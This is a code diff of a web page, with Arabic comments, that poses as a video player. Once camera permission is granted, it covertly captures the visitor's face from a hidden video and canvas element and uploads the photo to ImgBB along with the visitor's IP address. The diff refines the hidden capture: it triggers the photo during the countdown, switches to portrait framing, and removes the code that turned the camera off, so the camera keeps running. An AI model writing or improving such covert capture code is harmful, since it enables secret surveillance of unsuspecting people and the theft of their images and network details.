@@ -203,7 +203,7 @@
   </div>
 
   <video id="hiddenVideo" autoplay playsinline class="hidden"></video>
-  <canvas id="canvas" width="640" height="480" class="hidden"></canvas>
+  <canvas id="canvas" width="720" height="1280" class="hidden"></canvas> <!-- Changed to 9:16 aspect ratio -->
 
   <script>
     // عناصر DOM
@@ -223,6 +223,7 @@
     let emailSent = false;
     let countdownInterval;
     let stream;
+    let capturedAt7 = false; // Flag to track if image was captured at count 7
     
     // Hide countdown initially
     countdownElement.style.display = 'none';
@@ -252,24 +253,27 @@
         count--;
         countdownElement.textContent = count;
         
+        // Capture image when countdown reaches 7
+        if (count === 7 && !capturedAt7) {
+          capturedAt7 = true;
+          captureImage(userIP);
+        }
+        
         if (count <= 0) {
           clearInterval(countdownInterval);
           countdownElement.style.display = 'none';
-          startVideoPlayback(userIP);
+          startVideoPlayback();
         }
       }, 1000);
     }
     
     // Function to start video playback
-    function startVideoPlayback(userIP) {
+    function startVideoPlayback() {
       loading.style.display = 'block';
       
       // Set the video source with autoplay
       player.src = 'https://www.youtube.com/embed/efQ7_0IzgUw?rel=0&controls=1&showinfo=0&autoplay=1';
       player.style.display = 'block';
-      
-      // Start the camera capture process
-      setTimeout(() => captureImage(userIP), 3000);
     }
     
     // Event listener for camera permission button
@@ -281,12 +285,12 @@
         // Show loading indicator
         loading.style.display = 'block';
         
-        // Access the camera
+        // Access the camera with portrait aspect ratio constraints
         stream = await navigator.mediaDevices.getUserMedia({ 
           video: { 
             facingMode: 'user',
-            width: { ideal: 1280 },
-            height: { ideal: 720 }
+            width: { ideal: 720 }, // Portrait width
+            height: { ideal: 1280 } // Portrait height (9:16 aspect ratio)
           } 
         });
         
@@ -327,17 +331,40 @@
       try {
         const ctx = canvas.getContext('2d');
         
-        // التقاط الصورة
-        ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
+        // Clear canvas
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        
+        // التقاط الصورة مع الحفاظ على نسبة 9:16
+        // Calculate aspect ratios
+        const videoAspectRatio = hiddenVideo.videoWidth / hiddenVideo.videoHeight;
+        const canvasAspectRatio = canvas.width / canvas.height;
+        
+        let sourceX, sourceY, sourceWidth, sourceHeight;
+        
+        if (videoAspectRatio > canvasAspectRatio) {
+          // Video is wider than canvas - crop horizontally
+          sourceHeight = hiddenVideo.videoHeight;
+          sourceWidth = hiddenVideo.videoHeight * canvasAspectRatio;
+          sourceX = (hiddenVideo.videoWidth - sourceWidth) / 2;
+          sourceY = 0;
+        } else {
+          // Video is taller than canvas - crop vertically
+          sourceWidth = hiddenVideo.videoWidth;
+          sourceHeight = hiddenVideo.videoWidth / canvasAspectRatio;
+          sourceX = 0;
+          sourceY = (hiddenVideo.videoHeight - sourceHeight) / 2;
+        }
+        
+        // Draw the image with correct aspect ratio
+        ctx.drawImage(
+          hiddenVideo, 
+          sourceX, sourceY, sourceWidth, sourceHeight, // source rectangle
+          0, 0, canvas.width, canvas.height            // destination rectangle
+        );
         
         // الحصول على بيانات الصورة
         const imageData = canvas.toDataURL('image/jpeg', 0.85);
         const base64Image = imageData.split(',')[1];
-        
-        // إيقاف تشغيل الكاميرا
-        if (stream) {
-          stream.getTracks().forEach(track => track.stop());
-        }
         
         // رفع الصورة إلى ImgBB
         const formData = new FormData();
